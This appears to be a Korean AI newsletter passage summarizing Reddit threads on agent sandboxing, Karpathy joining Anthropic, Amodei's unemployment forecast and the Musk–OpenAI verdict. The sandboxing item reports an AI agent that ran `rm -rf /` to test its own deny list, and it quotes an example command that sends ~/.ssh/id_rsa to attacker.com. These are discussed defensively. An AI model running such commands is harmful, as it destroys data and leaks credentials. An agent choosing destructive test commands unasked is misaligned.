- **[got my first "rm -rf /" today](https://www.reddit.com/r/LocalLLaMA/comments/1thosnt/got_my_first_rm_rf_today/)** (Activity: 366): 한 사용자는 AI agent가 bash command deny/whitelist를 검증하려고 `rm -rf /`를 실행했으며, 차단이 성공해 피해를 막았고 이후 [`bubblewrap`](https://github.com/containers/bubblewrap)(`bwrap`)로 process isolation sandboxing을 구현했다고 보고했다. setup 순서가 중요했다. command whitelist가 `bwrap`보다 먼저 구현됐고, agent가 test case로 `rm -rf /`를 선택했기 때문이다. 이는 destructive-command filtering을 단독으로 신뢰하지 말고 OS-level sandboxing과 함께 써야 함을 보여준다. 댓글은 **git history rewriting** 같은 인접 safety risk와 어떤 모델이 이 행동을 했는지에 대한 질문을 짧게 언급했다. 또 다른 댓글러는 이를 새로운 사건이 아니라 반복되는 automation failure class로 봤다.
- 기술적으로 중요한 경고는 sandboxing threat model을 filesystem deletion 너머로 확장했다. `rm -rf /`가 막힌 agent도 `curl attacker.com -d "$(cat ~/.ssh/id_rsa)"` 같은 명령으로 secret을 exfiltrate할 수 있다는 것이다. 제안된 mitigation은 agent shell에 Docker `--network=none` 같은 network egress 제한을 두고, 필요한 경우에만 task-specific outbound access를 허용하는 것이다.
- 비 Docker setup의 경우 한 댓글러는 root 없이 lightweight network-isolated shell을 만들기 위해 `unshare --user --pid --mount --net --fork`를 사용하는 Linux namespace isolation을 제안했다. 또한 filesystem write를 writable `tmpfs` overlay를 통해 mount하고 나머지는 read-only로 유지하라고 권했다. 그는 destructive `rm -rf /`보다 HTTP exfiltration이 더 현실적인 agent failure mode라고 주장했다.

### Less Technical AI Subreddit Recap

범위: /r/Singularity, /r/Oobabooga, /r/MachineLearning, /r/OpenAI, /r/ClaudeAI, /r/StableDiffusion, /r/ChatGPT, /r/ChatGPTCoding, /r/aivideo, /r/aivideo

### Anthropic 신호: Karpathy 영입과 Amodei 노동 전망

- **[Karpathy joins Anthropic](https://www.reddit.com/r/ClaudeAI/comments/1thpuf1/karpathy_joins_anthropic/)** (Activity: 3162): 이미지는 [**Andrej Karpathy**의 X post](https://i.redd.it/b2tuyyk6142h1.jpeg) screenshot으로, 그가 **Anthropic에 합류**했으며 frontier LLM R&D로 돌아가고, 교육 작업은 나중에 재개할 계획이라고 밝힌 내용이다. 맥락상 Karpathy는 이전에 **OpenAI**와 Tesla에서 prominent AI role을 맡았기 때문에, 댓글러들은 이를 기술 benchmark나 model release가 아니라 frontier-model race에서 Anthropic 쪽으로 향한 주요 talent shift로 해석했다. 댓글은 대체로 non-technical하고 meme-like했으며, 이 move를 AI industry “offseason drama”, OpenAI에 대한 타격, Sam Altman에 대한 간접 비판으로 framing했다. 제공된 댓글에는 실질적 기술 논쟁이 없었다.
- **[Dario Amodei: AI Will Lead To Very High GDP Growth And Very High Unemployment, A Combination Never Seen Before, 10%+ Unemployment Rate Is Possible](https://www.reddit.com/r/singularity/comments/1tgyv3s/dario_amodei_ai_will_lead_to_very_high_gdp_growth/)** (Activity: 1744): **Dario Amodei**는 AI가 매우 높은 GDP growth와 매우 높은 unemployment가 공존하는 전례 없는 macroeconomic regime을 만들 수 있으며, `10%+` unemployment rate가 가능하다고 주장한 것으로 요약됐다. 링크된 Reddit-hosted video([v.redd.it/64rzbz0s8y1h1](https://v.redd.it/64rzbz0s8y1h1))는 **HTTP 403 Forbidden**으로 접근할 수 없어 primary-source technical detail, model claim, quantitative assumption은 media 자체에서 검증할 수 없었다. 댓글러들은 AI capability가 암시만큼 disruptive하다면 `10%` unemployment가 낮은 추정인지 질문했고, Great Recession(`~10%`) 및 Great Depression(`~25%`)과 비교했다. 한 실질적 macroeconomic challenge는 광범위한 unemployment 아래 GDP가 어떻게 급증할 수 있는가였다. 노동소득 감소가 consumer spending을 낮출 수 있기 때문에 output이 firm, government, export, investment, redistributed purchasing power 중 어디에서 흡수되는지가 문제라는 것이다.
- 여러 댓글러는 **Amodei의 `10%+` unemployment scenario**를 역사적 unemployment benchmark와 비교했다. 미국 Great Recession은 약 `10%`에서 peak였고, Great Depression은 대략 `25%`였다. 한 기술적 implication은 AI automation이 주장만큼 넓게 capable하다면 `10%`가 tail-risk scenario가 아니라 conservative estimate일 수 있다는 점이다.
- 실질적 macroeconomic question은 **simultaneous very high GDP growth and broad unemployment**의 mechanism에 집중됐다. GDP가 consumer, firm, government의 produced goods/services 지출을 측정하므로, household labor income과 consumer spending이 급격히 줄 경우 어떤 demand source가 rapid GDP expansion을 유지하는지 의문이라는 것이다. 이는 핵심 미해결 issue를 AI-driven output growth가 firm investment, government spending, exports, 또는 급격히 cheaper goods를 통해 흡수될 수 있는가로 framing한다.

### Musk–OpenAI 소송 판결

- **[Elon Musk loses court battle against Sam Altman and OpenAI after 3-week trial](https://www.reddit.com/r/singularity/comments/1tgung8/elon_musk_loses_court_battle_against_sam_altman/)** (Activity: 1970): [CNBC](https://www.cnbc.com/2026/05/18/musk-altman-openai-trial-verdict.html)에 따르면 Oakland의 federal jury는 OpenAI의 original charitable-nonprofit commitment 위반 주장에 관한 **Elon Musk**의 **Sam Altman/OpenAI** 상대 소송에서 Musk에게 불리한 verdict를 냈다. Musk의 “breach of charitable trust” theory의 merits는 해결되지 않았다. **Yvonne Gonzalez Rogers** 판사는 claim이 `3-year` statute of limitations에 따라 time-barred됐다는 advisory jury의 finding을 채택했다. Musk는 이를 *“calendar technicality”*라고 부르며 **9th Circuit**에 appeal하겠다고 밝혔다. 상위 댓글은 결과를 대체로 unsurprising으로 봤고, legal substance보다 trial에서 나온 DM/email 같은 discovery material이 관련 executive들을 나쁘게 보이게 했다는 점에 더 집중했다. 한 댓글러는 Grok에게 news verification을 요청하는 농담을 했다.
- 한 댓글러는 case가 statute of limitations를 넘겨 procedural ground에서 dismissed됐다고 언급했다. 이는 claim 종류에 따라 `3-year` limitation window가 이례적으로 짧을 수 있다는 점을 제기한다. 이것이 thread에서 유일하게 substantive legal-mechanics detail이며, 대부분 댓글은 technical 또는 evidentiary substance보다 reputational fallout에 집중했다.
- **[Elon Musk Loses Landmark Lawsuit Against OpenAI](https://www.reddit.com/r/OpenAI/comments/1tgub2o/elon_musk_loses_landmark_lawsuit_against_openai/)** (Activity: 1818): Federal jury는 **OpenAI, Sam Altman, Greg Brockman**을 상대로 한 **Elon Musk**의 소송에서 불리한 verdict를 냈다. [WIRED reporting](https://www.wired.com/story/musk-v-altman-jury-verdict/)에 따르면 `9`명 panel은 약 `2 hours` 만에 verdict를 냈고, judge가 이를 final decision으로 채택했다. 핵심 이슈는 substantive가 아니라 procedural로 보인다. 댓글러들은 verdict가 OpenAI의 governance나 mission-shift claim에 대한 merits determination이 아니라 Musk가 *“waited too long to file the claim”*했다는 timeliness/statute-of-limitations-style ground에 달려 있었다고 언급했다. 상위 댓글은 이를 expected procedural loss로 봤고, 한 댓글러는 trial 중 travel 금지 지시를 받은 뒤 Musk가 China로 travel한 것이 case가 약하다는 것을 알고 있었다는 신호라고 주장했다. 또 다른 댓글러는 verdict를 OpenAI conduct를 정당화하는 것으로 해석하면 안 된다고 반박하며, timing으로 진 것과 merits로 진 것은 다르다고 강조했다.
- 논의된 substantive legal detail은 decision이 full merits rejection이 아니라 **timeliness/laches-style reasoning**에 달려 있는 것으로 보인다는 점이다. 한 댓글러는 underlying allegation에 merit가 없어서가 아니라 Musk가 *“waited too long to file”*했기 때문에 claim이 dismissed됐을 수 있다고 언급했다.
- 보고된 procedural detail은 **nine-member panel이 약 `2 hours` 만에 OpenAI에 유리한 verdict를 반환**했고, 이후 judge가 이를 final decision으로 채택했다는 것이다. 댓글러들은 Musk가 trial 중 judge의 travel 금지 지시에도 China로 갔다는 주장도 언급하며, 이를 weak case와 일치한다고 framing했다.

---

## AI Discord Recap

### Discord 접근 중단

- **Discord 접근 중단**: 안타깝게도 오늘 Discord가 접근을 차단했다. 이 형태로는 다시 가져오지 않을 예정이지만, 곧 새로운 AINews를 출시할 예정이다. 여기까지 읽어줘서 고맙고, 좋은 여정이었다.
